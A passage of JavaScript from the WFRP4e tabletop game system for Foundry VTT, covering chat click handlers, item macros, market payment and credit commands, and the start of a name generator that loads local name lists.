      else if ($(event.currentTarget).attr("data-table") == "misfire") {
        let damage = $(event.currentTarget).attr("data-damage");
        html = game.i18n.format("ROLL.Misfire", { damage: damage });
      }
      else {
        html = await game.wfrp4e.tables.formatChatRoll($(event.currentTarget).attr("data-table"),
          {
            modifier: modifier,
            showRoll: true,
            messageId
          }, $(event.currentTarget).attr("data-column"));
      }

      chatOptions["content"] = html;
      chatOptions["type"] = 0;
      if (html)
        ChatMessage.create(chatOptions);

    }
  }

  /**
   * Post condition when clicked.
   * 
   * @param {Object} event click event
   */
  static handleConditionClick(event) {
    let cond = $(event.currentTarget).attr("data-cond");
    if (!cond)
      cond = event.target.text.trim();
    if (!isNaN(cond.split(" ").pop())) // check if the condition level is specified
      cond = cond.split(" ").slice(0, -1).join(" "); // remove the condition level
    let condkey = WFRP_Utility.findKey(cond, game.wfrp4e.config.conditions, { caseInsensitive: true });
    let condName = game.wfrp4e.config.conditions[condkey];
    let condDescr = game.wfrp4e.config.conditionDescriptions[condkey];
    let messageContent = `<b>${condName}</b><br>${condDescr}`;

     messageContent = ChatWFRP.addEffectButtons(messageContent, [condkey]);

    let chatData = WFRP_Utility.chatDataSetup(messageContent);
    ChatMessage.create(chatData);
  }

  /**
   * Post property description when clicked.
   *
   * @param {Object} event click event
   */
  static handlePropertyClick(event) {
    let prop = event.target.text.trim();

    // If property rating is present, remove it
    if (!isNaN(prop.split(" ").pop()))
      prop = prop.split(" ").slice(0, -1).join(" ");

    const allProps = game.wfrp4e.utility.allProperties();
    const propKey = WFRP_Utility.findKey(prop, allProps, { caseInsensitive: true });
    const propName = allProps[propKey];
    const description = game.wfrp4e.config.qualityDescriptions[propKey] || game.wfrp4e.config.flawDescriptions[propKey];
    const messageContent = `<b>${propName}</b><br>${description}`;

    const chatData = WFRP_Utility.chatDataSetup(messageContent, null);
    ChatMessage.create(chatData);
  }

  /**
   * Post symptom when clicked
   * 
   * @param {Object} event click event
   */
  static handleSymptomClick(event) {
    let symptom = $(event.currentTarget).attr("data-symptom");
    if (!symptom)
      symptom = event.target.text;
    WFRP_Utility.postSymptom(symptom);
  }

  /**
   * Roll to chat when roll entity is clicked
   * 
   * @param {Object} event clicke event
   */
  static async handleRollClick(event) {
    let roll = $(event.currentTarget).attr("data-roll");
    if (!roll)
      roll = event.target.text.trim();
    let rollMode = game.settings.get("core", "rollMode");
    (await new Roll(roll).roll()).toMessage(
      {
        user: game.user.id,
        rollMode
      });
  }


  /**
 * Handle a payment entity link
 * 
 * @param {Object} event clicke event
 */
  static handlePayClick(event) {
    let payString = $(event.currentTarget).attr("data-pay");
    if (game.user.isGM)
      MarketWfrp4e.generatePayCard(payString);
  }

  static handleCreditClick(event) {
    let creditString = $(event.currentTarget).attr("data-credit");
    let amt = creditString.split(" ")[0];
    let option = creditString.split(" ")[1];
    if (game.user.isGM)
      MarketWfrp4e.processCredit(amt, option);

  }

  static handleCorruptionClick(event) {
    return this.postCorruptionTest($(event.currentTarget).attr("data-strength"));
  }

  static postCorruptionTest(strength, chatData={}) {
    renderTemplate("systems/wfrp4e/templates/chat/corruption.hbs", { strength }).then(html => {
      ChatMessage.create(foundry.utils.mergeObject({ content: html }, chatData));
    });
  }


  static handleFearClick(event) {
    let target = $(event.currentTarget);
    return this.postFear(target.attr("data-value"), target.attr("data-name"));
  }

  static postFear(value = 0, name = undefined) {
    if (isNaN(value))
      value = 0;
    let title = `${game.i18n.localize("CHAT.Fear")} ${value}`;
    if (name)
      title += ` - ${name}`;
    renderTemplate("systems/wfrp4e/templates/chat/fear.hbs", { value, name, title }).then(html => {
      ChatMessage.create({ content: html, speaker: { alias: name } });
    });
  }

  static handleTerrorClick(event) {
    let target = $(event.currentTarget);
    return this.postTerror(target.attr("data-value"), target.attr("data-name"));
  }

  static handleExpClick(event) {
    let target = $(event.currentTarget);
    return this.postExp(target.attr("data-amount"), target.attr("data-reason"));
  }

  static postTerror(value = 1, name = undefined) {
    if (isNaN(value))
      value = 1;
    let title = `${game.i18n.localize("CHAT.Terror")} ${value}`;
    if (name)
      title += ` - ${name}`;
    renderTemplate("systems/wfrp4e/templates/chat/terror.hbs", { value, name, title }).then(html => {
      ChatMessage.create({ content: html, speaker: { alias: name } });
    });
  }


  static postExp(amount, reason = undefined) {
    if (isNaN(amount))
      return ui.notifications.error(game.i18n.localize("ERROR.Experience"))

    let title = `${game.i18n.localize("CHAT.Experience")}`;

    renderTemplate("systems/wfrp4e/templates/chat/experience.hbs", { title, amount, reason }).then(html => {
      ChatMessage.create({ content: html });
    });
  }


  static _onDragConditionLink(event) {
    event.stopPropagation();
    const a = event.currentTarget;
    let dragData = null;
    dragData = { type: "condition", payload: a.dataset.cond };

    event.originalEvent.dataTransfer.setData("text/plain", JSON.stringify(dragData));
  }

  /**
   * Retrieves the item being requested by the macro from the selected actor,
   * sending it to the correct setup____ function to be rolled.
   * 
   * @param {String} itemName name of item being rolled
   * @param {String} itemType type of item ("weapon", "spell", etc)
   */
  static rollItemMacro(itemName, itemType, bypassData) {
    const speaker = ChatMessage.getSpeaker();
    let actor;
    if (speaker.token) actor = game.actors.tokens[speaker.token];
    if (!actor) actor = game.actors.get(speaker.actor);
    let item;
    // Not technically an item, used for convenience
    if (itemType == "characteristic") {
      return actor.setupCharacteristic(itemName, bypassData).then(test => test.roll());
    }
    else {
      item = actor ? actor.itemTypes[itemType].find(i => i.name === itemName) : null;
    }
    if (!item) return ui.notifications.warn(`${game.i18n.localize("ErrorMacroItemMissing")} ${itemName}`);

    // Trigger the item roll
    switch (item.type) {
      case "weapon":
        return actor.setupWeapon(item, bypassData).then(test => test.roll());
      case "spell":
        return actor.sheet.spellDialog(item, bypassData)
      case "prayer":
        return actor.setupPrayer(item, bypassData).then(test => test.roll());
      case "trait":
        return actor.setupTrait(item, bypassData).then(test => test.roll());
      case "skill":
        return actor.setupSkill(item, bypassData).then(test => test.roll());
    }
  }

  static async toggleMorrslieb() {

    let morrsliebActive = canvas.scene.getFlag("wfrp4e", "morrslieb");
    morrsliebActive = !morrsliebActive;
    await canvas.scene.setFlag("wfrp4e", "morrslieb", morrsliebActive);

    if (game.modules.get("fxmaster") && game.modules.get("fxmaster").active) {
      FXMASTER.filters.switch("morrslieb", "color", CONFIG.MorrsliebObject);
    }
    else {
      game.socket.emit("system.wfrp4e", {
        type: "morrslieb"
      });
      canvas.draw();
    }
  }

  /**
  * Checks that the selected advancement can be afforded by the actor
  *
  * @param {Integer} total: the xp total for the actor
  * @param {Integer} spent: the spent xp plus cost
  * @param {String} action: the action, buy or improve for example
  * @param {String} item: the title of the skill, talent or characteristic
  */
  static checkValidAdvancement(total, spent, action, item) {
    if(total - spent < 0) {
       throw new Error(game.i18n.format("ACTOR.AdvancementError", { action: action, item: item }));
    }
  }


  static updateGroupAdvantage({players=undefined, enemies=undefined}={})
  {
    if (!game.user.isGM)
    {
      game.socket.emit("system.wfrp4e", {type : "changeGroupAdvantage", payload : {players, enemies}});
    }
    else if (game.user.isUniqueGM)
    {
      let advantage = game.settings.get("wfrp4e", "groupAdvantageValues");
      if (Number.isNumeric(players))
        advantage.players = players;
      if (Number.isNumeric(enemies))
        advantage.enemies = enemies;
    
      return game.settings.set("wfrp4e", "groupAdvantageValues", advantage)
    }
  }

  static log(message, force=false, args) {
    if (CONFIG.debug.wfrp4e || force)
      console.log(`%cWFRP4e` + `%c | ${message}`, "color: gold", "color: unset", args || "");
  }

  
  static logHomebrew(message) {
    this.log("Applying Homebrew Rule: " + message, true);
  }

  static extractLinkLabel(link)
  {
    let text;
    try {
      // Extract text
      text = Array.from(link.matchAll(/{(.+?)}/gm))[0][1];
      if (!text)
        text = link;
    }
    catch(e)
    {
      text = link;
    }
    return text
  }


  // Since popout tokens display very small in HTML, try to replace them
  static replacePopoutTokens(html) {
    // Try to replace popout tokens in chat
    let images = html.find('img:not(.profile)'); // This is required to prevent saving the absolute actor image path
    Array.from(images).forEach(async element => {
      element.src = this.replacePopoutPath(element.src);
    });
  }

  static replacePopoutPath(path)
  {
    if (path.includes("tokens/popout/")) { 
      WFRP_Utility.log("Replacing popout token: " + path);
    }
    return path.replace("tokens/popout/", "tokens/");
  }

  static async sleep(ms) {
    await new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Find the owner of a document, prioritizing non-GM users 
   * 
   * @param {Object} document Document whose owner is being found
   * @returns 
   */
    static getActiveDocumentOwner(document)
    {
        // let document = fromUuidSync(uuid);
        if (document.documentName == "Item" && document.isOwned)
        {
            document = document.actor;
        }
        let activePlayers = game.users.contents.filter(u => u.active && u.role <= 2); // Not assistant or GM 
        let owningUser;

        // First, prioritize if any user has this document as their assigned character
        owningUser = activePlayers.find(u => u.character?.id == document.id);

        // If not found, find the first non-GM user that can update this document
        if (!owningUser)
        {
            owningUser = activePlayers.find(u => document.testUserPermission(u, "OWNER"));
        }

        // If still no owning user, simply find the first GM
        if (!owningUser)
        {
            owningUser = game.users.contents.filter(u => u.active).find(u => u.isGM);
        }
        return owningUser;
    }

  static mergeCareerReplacements(replacements)
  {

    // For each species in added replacements
    for(let species in replacements)
    {
      // Check if there already is a species listing
      if (game.wfrp4e.config.speciesCareerReplacements[species])
      {
        let currentReplacements = game.wfrp4e.config.speciesCareerReplacements[species];

        // For each career in the added replacements
        for(let career in replacements[species])
        {
          // If there are replacement options already, concatenate them
          if (currentReplacements[career]?.length > 0)
          {
            currentReplacements[career] = currentReplacements[career].concat(replacements[species][career]);
          }
          else  // If no current replacement opions, simply use the added replacements
          {
            currentReplacements[career] = replacements[species][career];
          }
        }
      }
      else // If no species listing, simply use the added replacements 
      {
        game.wfrp4e.config.speciesCareerReplacements[species] = replacements[species];
      }
    }
  }

  // Add the source of a compendium link
  // e.g. Compendium.wfrp4e-core -> (WFRP4e Core Rulebook) tooltip
  static addLinkSources(html)
  {
    html.find(".content-link").each((index, element) => {
      let uuid = element.dataset.uuid;
      let tooltip = element.dataset.tooltip || "";
      if (uuid)
      {
        let moduleKey = uuid.split(".")[1];
        if (game.wfrp4e.config.premiumModules[moduleKey])
        {
          if (!tooltip)
          {
            tooltip = `${game.wfrp4e.config.premiumModules[moduleKey]}`;
          }
          else 
          {
            tooltip += ` (${game.wfrp4e.config.premiumModules[moduleKey]})`;
          }
        }
      }

      element.dataset.tooltip = tooltip;

    });
  }
}


Hooks.on("renderFilePicker", (app, html, data) => {
  let folder = data.target.split("/")[0];
  if (folder == "systems" || folder == "modules") {
    html.find("input[name='upload']").css("display", "none");
    let label = html.find(".upload-file label");
    label.text("Upload Disabled");
    label.append(`<i data-tooltip="Upload disabled while in system directory. DO NOT put your assets within any system or module folder." style="display:inline-block; margin-left:5px;" class="fa-regular fa-circle-question"></i>`);
  }
});

/**
 * WIP
 * This class contains functions and helpers related to the market and Pay system
 */
class MarketWfrp4e {
  /**
   * Roll a test for the availability and the stock quantity of an item based on the rulebook
   * Takes as a parameter an object with localized settlement type, localized rarity and a modifier for the roll
   * @param {Object} options settlement, rarity, modifier
   */
  static async testForAvailability({ settlement, rarity, modifier }) {
    //This method read the table  game.wfrp4e.config.availabilityTable defined in the config file

    //First we get the different settlements size
    let validSettlements = Object.getOwnPropertyNames(game.wfrp4e.config.availabilityTable);
    let validSettlementsLocalized = {};
    let validRarityLocalized = {};

    //For each settlements we found in the config, we try to translate them and we build a correlation table
    validSettlements.forEach(function (index) {
      validSettlementsLocalized[game.i18n.localize(index).toLowerCase()] = index;
    });

    //If we found a valid settlement size, we now do the same thing for the rarity datas
    if (settlement && validSettlementsLocalized.hasOwnProperty(settlement)) {
      let validRarity = Object.getOwnPropertyNames(game.wfrp4e.config.availabilityTable[validSettlementsLocalized[settlement]]);
      validRarity.forEach(function (index) {
        validRarityLocalized[game.i18n.localize(index).toLowerCase()] = index;
      });
    }

    let msg = `<h3><b>${game.i18n.localize("MARKET.AvailabilityTest")}</b></h3>`;

    //If at least one of the args isnt specified or if the specified options are not valid, we give informations on the correct syntax
    if (!settlement || !rarity || !validSettlementsLocalized.hasOwnProperty(settlement) || !validRarityLocalized.hasOwnProperty(rarity)) {
      msg += `<p>${game.i18n.localize("MARKET.AvailWrongCommand")}</p><p><i>${game.i18n.localize("MARKET.AvailCommandExample")}</i></p>`;
    }
    //Everything is ok, lets roll for availability
    else {
      let roll = await new Roll("1d100 - @modifier", { modifier: modifier }).roll();
      //we retrieve the correct line
      let availabilityLookup = game.wfrp4e.config.availabilityTable[validSettlementsLocalized[settlement]][validRarityLocalized[rarity]];
      let isAvailable = availabilityLookup.test > 0 && roll.total <= availabilityLookup.test;

      let finalResult = {
        settlement: settlement.charAt(0).toUpperCase() + settlement.slice(1),
        rarity: rarity.charAt(0).toUpperCase() + rarity.slice(1),
        instock: isAvailable ? game.i18n.localize("Yes") : game.i18n.localize("No"),
        quantity: isAvailable ? availabilityLookup.stock : 0,
        roll: roll.total
      };

      //We roll the stock if we detect a valid roll value
      if (availabilityLookup.stock.includes("d")) {
        let stockRoll = await new Roll(availabilityLookup.stock).roll();
        finalResult.quantity = stockRoll.total;
      }

      //Format the message before sending it back to chat
      msg += this.formatTestForChat(finalResult);
    }
    ChatMessage.create(WFRP_Utility.chatDataSetup(msg, "roll", true));
  }

  /**
   * Format an availability test before sending it to chat
   * @param {Object} result
   */
  static formatTestForChat(result) {
    return `
        <b>${game.i18n.localize("MARKET.SettlementSize")}</b> ${result.settlement}<br>
        <b>${game.i18n.localize("MARKET.Rarity")}</b> ${result.rarity}<br><br>
        <b>${game.i18n.localize("MARKET.InStock")}</b> ${result.instock}<br>
        <b>${game.i18n.localize("MARKET.QuantityAvailable")}</b> ${result.quantity}<br>
        <b>${game.i18n.localize("Roll")}:</b> ${result.roll}
      `;
  }

  /**
   * Send a whispered card menu to the player to start an availability test
   * The card let him choose a settlement size
   * @param {String} rarity
   */
  static generateSettlementChoice(rarity) {
    let cardData = { rarity: game.wfrp4e.config.availability[rarity] };
    renderTemplate("systems/wfrp4e/templates/chat/market/market-settlement.hbs", cardData).then(html => {
      let chatData = WFRP_Utility.chatDataSetup(html, "selfroll");
      ChatMessage.create(chatData);
    });
  }

  /**
   * Consolidate every money the player has in order to give him the fewer coins possible
   * @param {Array} money
   */
  static consolidateMoney(money) {
    //We sort the money from the highest BP value to the lowest (so gc => ss => bp)
    //This allow us to deal with custom money too and to not be dependent on the money name (translation errors could break the code otherwise)
    money.sort((a, b) => b.system.coinValue.value - a.system.coinValue.value);

    let brass = 0;
    //First we calculate the BP value
    for (let m of money)
      brass += m.system.quantity.value * m.system.coinValue.value;

    //Then we consolidate the coins
    for (let m of money) {
      //We don't know what players could create as a custom money and we dont want to divide by zero, ever. It would kill a kitten somewhere, probably.
      if (m.system.coinValue.value <= 0)
        break;
      m.system.quantity.value = Math.trunc(brass / m.system.coinValue.value);
      brass = brass % m.system.coinValue.value;
    }

    return money;
  }

  /**
   * Execute a /credit amount and add the money to the player inventory
   * @param {string} amount the amount of money transfered
   * @param {Array} moneyItemInventory
   */
  static creditCommand(amount, actor, options = {}) {
    //First we parse the amount
    let moneyItemInventory = actor.getItemTypes("money").map(i => i.toObject());
    let moneyToSend = this.parseMoneyTransactionString(amount);
    let msg = `<h3><b>${game.i18n.localize("MARKET.CreditCommand")}</b></h3>`;
    let errorOccured = false;
    //Wrong amount
    if (!moneyToSend) {
      msg += `<p>${game.i18n.localize("MARKET.MoneyTransactionWrongCommand")}</p><p><i>${game.i18n.localize("MARKET.CreditCommandExample")}</i></p>`;
      errorOccured = true;
    }
    //Command is ok, let's try to pay
    else {
      //We need to get the character money items for gc, ss and bp. This is a "best effort" lookup method. If it fails, we stop the amount to prevent any data loss.
      let characterMoney = this.getCharacterMoney(moneyItemInventory);
      this.checkCharacterMoneyValidity(moneyItemInventory, characterMoney);

      //If one money is missing, we stop here before doing anything bad
      if (Object.values(characterMoney).includes(false)) {
        msg += `<p>${game.i18n.localize("MARKET.CantFindMoneyItems")}</p>`;
        errorOccured = true;
      } else {
        //Great, we can just deduce the quantity for each money
        moneyItemInventory[characterMoney.gc].system.quantity.value += moneyToSend.gc;
        moneyItemInventory[characterMoney.ss].system.quantity.value += moneyToSend.ss;
        moneyItemInventory[characterMoney.bp].system.quantity.value += moneyToSend.bp;
      }
    }
    if (errorOccured)
      moneyItemInventory = false;
    else {
      msg += game.i18n.format("MARKET.Credit", {
        number1: moneyToSend.gc,
        number2: moneyToSend.ss,
        number3: moneyToSend.bp
      });
      msg += `<br><b>${game.i18n.localize("MARKET.ReceivedBy")}</b> ${actor.name}`;
      this.throwMoney(moneyToSend);

    }
    if (options.suppressMessage)
      ui.notifications.notify(`${actor.name} received ${moneyToSend.gc}${game.i18n.localize("MARKET.Abbrev.GC")} ${moneyToSend.ss}${game.i18n.localize("MARKET.Abbrev.SS")} ${moneyToSend.bp}${game.i18n.localize("MARKET.Abbrev.BP")}`);
    else
      ChatMessage.create(WFRP_Utility.chatDataSetup(msg, "roll"));
    return moneyItemInventory;
  }

  /**
   * Execute a /pay command and remove the money from an actor inventory, without chat card
   * @param {String} amount
   * @param {Actor} actor
   */
   static directPayCommand(amount, actor, options = {}) {
    let moneyPaid = this.payCommand(amount, actor);
    if (moneyPaid) {
      actor.updateEmbeddedDocuments("Item", moneyPaid);
    }
  }

  /**
   * Execute a /pay command and remove the money from the player inventory
   * @param {String} command
   * @param {Array} moneyItemInventory
   * @param transactionType  game.wfrp4e.config.transactionType, is it a payment or an income
   */
  static payCommand(command, actor, options = {}) {
    //First we parse the command
    let moneyItemInventory = actor.getItemTypes("money").map(i => i.toObject());
    let moneyToPay = this.parseMoneyTransactionString(command);
    let msg = `<h3><b>${game.i18n.localize("MARKET.PayCommand")}</b></h3>`;
    let errorOccured = false;
    //Wrong command
    if (!moneyToPay) {
      msg += `<p>${game.i18n.localize("MARKET.MoneyTransactionWrongCommand")}</p><p><i>${game.i18n.localize("MARKET.PayCommandExample")}</i></p>`;
      errorOccured = true;
    }
    //Command is ok, let's try to pay
    else {
      //We need to get the character money items for gc, ss and bp. This is a "best effort" lookup method. If it fails, we stop the command to prevent any data loss.
      let characterMoney = this.getCharacterMoney(moneyItemInventory);
      this.checkCharacterMoneyValidity(moneyItemInventory, characterMoney);
      //If one money is missing, we stop here before doing anything bad
      if (Object.values(characterMoney).includes(false)) {
        msg += `<p>${game.i18n.localize("MARKET.CantFindMoneyItems")}</p>`;
        errorOccured = true;
      } else {
        //Now its time to check if the actor has enough money to pay
        //We'll start by trying to pay without consolidating the money
        if (moneyToPay.gc <= moneyItemInventory[characterMoney.gc].system.quantity.value &&
          moneyToPay.ss <= moneyItemInventory[characterMoney.ss].system.quantity.value &&
          moneyToPay.bp <= moneyItemInventory[characterMoney.bp].system.quantity.value) {
          //Great, we can just deduce the quantity for each money
          moneyItemInventory[characterMoney.gc].system.quantity.value -= moneyToPay.gc;
          moneyItemInventory[characterMoney.ss].system.quantity.value -= moneyToPay.ss;
          moneyItemInventory[characterMoney.bp].system.quantity.value -= moneyToPay.bp;
        } else //We'll need to calculate the brass value on both the pay command and the actor inventory, and then consolidate
        {
          let totalBPAvailable = 0;
          for (let m of moneyItemInventory)
            totalBPAvailable += m.system.quantity.value * m.system.coinValue.value;

          let totalBPPay = moneyToPay.gc * 240 + moneyToPay.ss * 12 + moneyToPay.bp;

          //Does we have enough money in the end?
          if (totalBPAvailable < totalBPPay) {
            //No
            msg += `${game.i18n.localize("MARKET.NotEnoughMoney")}<br>
              <b>${game.i18n.localize("MARKET.MoneyNeeded")}</b> ${totalBPPay} ${game.i18n.localize("NAME.BP")}<br>
              <b>${game.i18n.localize("MARKET.MoneyAvailable")}</b> ${totalBPAvailable} ${game.i18n.localize("NAME.BP")}`;
            errorOccured = true;
          } else //Yes!
          {
            totalBPAvailable -= totalBPPay;
            moneyItemInventory[characterMoney.gc].system.quantity.value = 0;
            moneyItemInventory[characterMoney.ss].system.quantity.value = 0;
            moneyItemInventory[characterMoney.bp].system.quantity.value = totalBPAvailable;

            //Then we consolidate
            moneyItemInventory = this.consolidateMoney(moneyItemInventory);
          }
        }
      }
    }
    if (errorOccured) {
      moneyItemInventory = false;
    } else {
      msg += game.i18n.format("MARKET.Paid", {
        number1: moneyToPay.gc,
        number2: moneyToPay.ss,
        number3: moneyToPay.bp
      });
      msg += `<br><b>${game.i18n.localize("MARKET.PaidBy")}</b> ${actor.name}`;

      this.throwMoney(moneyToPay);
    }
    if (options.suppressMessage)
      ui.notifications.notify(msg);
    else
      ChatMessage.create(WFRP_Utility.chatDataSetup(msg, "roll"));
    return moneyItemInventory;
  }

  /**
   * we'll try to look for the coin value equals to the gc/ss/bp coin value for any entry that wasn't found.
   * This allows for a better chance at detecting the money items, as they are currently not properly identified by a unique id. Meaning if a translation module made a typo in the compendium
   * or if a player/gm edit the name of the money items for any reasons, it would not be found by the first method
   * @param moneyItemInventory
   * @param characterMoney
   */
  static checkCharacterMoneyValidity(moneyItemInventory, characterMoney) {
    for (let m = 0; m < moneyItemInventory.length; m++) {
      switch (moneyItemInventory[m].system.coinValue.value) {
        case 240://gc
          if (characterMoney.gc === false)
            characterMoney.gc = m;
          break;
        case 12://ss
          if (characterMoney.ss === false)
            characterMoney.ss = m;
          break;
        case 1://bp
          if (characterMoney.bp === false)
            characterMoney.bp = m;
          break;
      }
    }
  }

  /**
   * From a moneyItemInventory we get the money of the character (GC, SS and BP)
   * @param moneyItemInventory
   * @returns {{ss: boolean, gc: boolean, bp: boolean}}
   */
  static getCharacterMoney(moneyItemInventory) {
    let moneyTypeIndex = {
      gc: false,
      ss: false,
      bp: false
    };
    //First we'll try to look at the localized name
    for (let m = 0; m < moneyItemInventory.length; m++) {
      switch (moneyItemInventory[m].name) {
        case game.i18n.localize("NAME.GC"):
          moneyTypeIndex.gc = m;
          break;
        case game.i18n.localize("NAME.SS"):
          moneyTypeIndex.ss = m;
          break;
        case game.i18n.localize("NAME.BP"):
          moneyTypeIndex.bp = m;
          break;
      }
    }
    return moneyTypeIndex;
  }

  static throwMoney(moneyValues) {
    let number = moneyValues.gc || 0;
    if ((moneyValues.ss || 0) > number)
      number = moneyValues.ss || 0;
    if ((moneyValues.bp || 0) > number)
      number = moneyValues.bp || 0;

    if (game.dice3d && game.settings.get("wfrp4e", "throwMoney")) {
      new Roll(`${number}dc`).evaluate().then((roll) => {
        game.dice3d.showForRoll(roll);
      });
    }
  }

  /**
   * Parse a price string
   * Like "8gc6bp" or "74ss 12gc", etc
   * This method use localized abbreviations
   * return an object with the moneys and quantity
   * @param {String} string
   * @returns {Object}
   */
  static parseMoneyTransactionString(string) {
    //Regular expression to match any number followed by any abbreviation. Ignore whitespaces
    const expression = /((\d+)\s?(\p{L}+))/ug;
    let matches = [...string.matchAll(expression)];

    let payRecap = {
      gc: 0,
      ss: 0,
      bp: 0
    };
    let isValid = matches.length;
    for (let match of matches) {
      //Check if we have a valid command. We should have 4 groups per match
      if (match.length !== 4) {
        isValid = false;
        break;
      }
      //Should contains the abbreviated money (like "gc")
      switch (match[3].toLowerCase()) {
        case game.i18n.localize("MARKET.Abbrev.GC").toLowerCase():
          payRecap.gc += parseInt(match[2], 10);
          break;
        case game.i18n.localize("MARKET.Abbrev.SS").toLowerCase():
          payRecap.ss += parseInt(match[2], 10);
          break;
        case game.i18n.localize("MARKET.Abbrev.BP").toLowerCase():
          payRecap.bp += parseInt(match[2], 10);
          break;
      }
    }
    if (isValid && (payRecap.gc + payRecap.ss + payRecap.bp === 0))
      isValid = false;
    if (isValid && (payRecap.gc + payRecap.ss + payRecap.bp === 0))
      isValid = false;
    return isValid ? payRecap : false;
  }

  /**
   * Generate a card in the chat with a "Pay" button.
   * GM Only
   * @param {String} payRequest
   */
  static generatePayCard(payRequest, player) {
    let parsedPayRequest = this.parseMoneyTransactionString(payRequest);
    //If the /pay command has a syntax error, we display an error message to the gm
    if (!parsedPayRequest) {
      let msg = `<h3><b>${game.i18n.localize("MARKET.PayRequest")}</b></h3>`;
      msg += `<p>${game.i18n.localize("MARKET.MoneyTransactionWrongCommand")}</p><p><i>${game.i18n.localize("MARKET.PayCommandExample")}</i></p>`;
      ChatMessage.create(WFRP_Utility.chatDataSetup(msg, "gmroll"));
    } else //generate a card with a summary and a pay button
    {
      let cardData = {
        payRequest: payRequest,
        QtGC: parsedPayRequest.gc,
        QtSS: parsedPayRequest.ss,
        QtBP: parsedPayRequest.bp
      };
      renderTemplate("systems/wfrp4e/templates/chat/market/market-pay.hbs", cardData).then(html => {
        let chatData = WFRP_Utility.chatDataSetup(html, "roll", false, {forceWhisper: player});
        ChatMessage.create(chatData);
      });
    }
  }

  /**
* Make some change ... to avoid player going around with tons of bronze coins
* @param {int} amount
* @returns {Object} an amount {amount.gc,amount.ss,amount.bp}
*/
  static makeSomeChange(amount, bpRemainder) {
    let gc = 0, ss = 0, bp = 0;
    if (amount >= 0) {
      gc = Math.floor(amount / 240);
      amount = amount % 240;
      ss = Math.floor(amount / 12);
      bp = amount % 12;
      bp = bp + ((bpRemainder > 0) ? 1 : 0);
    }
    return { gc: gc, ss: ss, bp: bp };
  }

  /**
* Transforms an amount of money to a string with value + currency like 2gc4ss8bp localized.
* @param {Object} amount
* @return {String} the amount
*/
  static amountToString(amount) {
    let gc = game.i18n.localize("MARKET.Abbrev.GC");
    let ss = game.i18n.localize("MARKET.Abbrev.SS");
    let bp = game.i18n.localize("MARKET.Abbrev.BP");
    return `${amount.gc || amount.g || 0}${gc} ${amount.ss || amount.s || 0}${ss} ${amount.bp || amount.b || 0}${bp}`
  }


  /**
*
* @param initialAmount {Object} {initialAmount.gc,initialAmount.ss,initialAmount.bp}
* @param {int} nbOfPlayers to split among them
* return amount {Object} an amount {amount.gc,amount.ss,amount.bp}
*/
  static splitAmountBetweenAllPlayers(initialAmount, nbOfPlayers) {
    // convert initialAmount in bp
    let bpAmount = initialAmount.gc * 240 + initialAmount.ss * 12 + initialAmount.bp;
    // divide bpAmount by nb of players and get the true remainder
    let bpRemainder = bpAmount % nbOfPlayers;
    bpAmount = Math.floor(bpAmount / nbOfPlayers);
    // rebuild an amount of gc/ss/bp from bpAmount
    let amount = this.makeSomeChange(bpAmount, bpRemainder);
    return amount;
  }


  /**TODO: Known Issue: /credit amount actor does not provide a chat message to the owning player
   * Process the credit management options.
   * GM Only
   * @param {String} creditRequest
   * @param {String} optionOrName
   */
  static processCredit(creditRequest, optionOrName) {
    let parsedPayRequest = this.parseMoneyTransactionString(creditRequest);

    //If the /credit command has a syntax error, we display an error message to the gm
    if (!parsedPayRequest) {
      let msg = `<h3><b>${game.i18n.localize("MARKET.CreditRequest")}</b></h3>`;
      msg += `<p>${game.i18n.localize("MARKET.MoneyTransactionWrongCommand")}</p><p><i>${game.i18n.localize("MARKET.CreditCommandExample")}</i></p>`;
      ChatMessage.create(WFRP_Utility.chatDataSetup(msg, "gmroll"));
    } else //generate a card with a summary and a receive button
    {
      let amount, message, forceWhisper;
      optionOrName = optionOrName || "split"; // Default behavior

      // Process split/each options
      let nbActivePlayers = Array.from(game.users).filter(u => u.role != 4 && u.active).length;
      if ( optionOrName.toLowerCase() == "each" || optionOrName.toLowerCase() == "split") {
        if (nbActivePlayers == 0 ) {
          let message = game.i18n.localize("MARKET.NoPlayers");
          ChatMessage.create({ content: message });
          return
        }
        if (optionOrName.toLowerCase() === "split") {
          amount = this.splitAmountBetweenAllPlayers(parsedPayRequest, nbActivePlayers);
          message = game.i18n.format("MARKET.RequestMessageForSplitCredit", {
            activePlayerNumber: nbActivePlayers,
            initialAmount: this.amountToString(parsedPayRequest)
          });
        }
        else if (optionOrName.toLowerCase() === "each") {
          amount = parsedPayRequest;
          message = game.i18n.format("MARKET.RequestMessageForEachCredit", {
            activePlayerNumber: nbActivePlayers,
            initialAmount: this.amountToString(parsedPayRequest)
          });
        }
      } else {
        amount = parsedPayRequest;
        let paName = optionOrName.trim().toLowerCase();
        let player = game.users.players.filter(p => p.name.toLowerCase() == paName);
        if (player[0]) { // Player found !
          forceWhisper = player[0].name;
          message = game.i18n.format("MARKET.CreditToUser", {
            userName: player[0].name,
            initialAmount: this.amountToString(parsedPayRequest)
          });
        } else {
          let actor = game.actors.find(a => a.name.toLowerCase().includes(paName.toLowerCase()) );
          if ( actor) {
            let money = this.creditCommand(this.amountToString(amount), actor); // Imediate processing!
            if (money) {
              actor.updateEmbeddedDocuments("Item", money);
            }
            return
          } else {
            message = game.i18n.localize("MARKET.NoMatchingPlayer");
            ChatMessage.create({ content: message });
            return
          }
        }
      }
      let cardData = {
        digestMessage: message,
        amount: this.amountToString(amount),
        QtGC: amount.gc,
        QtSS: amount.ss,
        QtBP: amount.bp
      };
      renderTemplate("systems/wfrp4e/templates/chat/market/market-credit.hbs", cardData).then(html => {
        let chatData = WFRP_Utility.chatDataSetup(html, "roll", false, {forceWhisper});
        foundry.utils.setProperty(chatData, "flags.wfrp4e.instances", nbActivePlayers);
        ChatMessage.create(chatData);
      });
    }
  }
}

/**
 * Specialized class to consume and generate from a large list of human name options extracted from
 * http://www.windsofchaos.com/wp-content/uploads/encroachment/book-of-imperial-names.pdf
 * See the `names` folder in the system directory to examine the list of names and options.
 */


class NameGenWfrp {
  static _loadNames() {
    WFRP_Utility.log("Loading Names...", true);

    // Surname option 1
    fetch("systems/wfrp4e/names/human_surnames.txt").then(r => r.text()).then(async nameText => {
      this.surnames = [];
      nameText.split("\n").forEach((nameGroup) => this.surnames.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });
    // Surname option 2 - prefix
    fetch("systems/wfrp4e/names/human_surnames_prefix.txt").then(r => r.text()).then(async nameText => {
      this.surnamePrefixes = [];
      nameText.split("\n").forEach((nameGroup) => this.surnamePrefixes.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

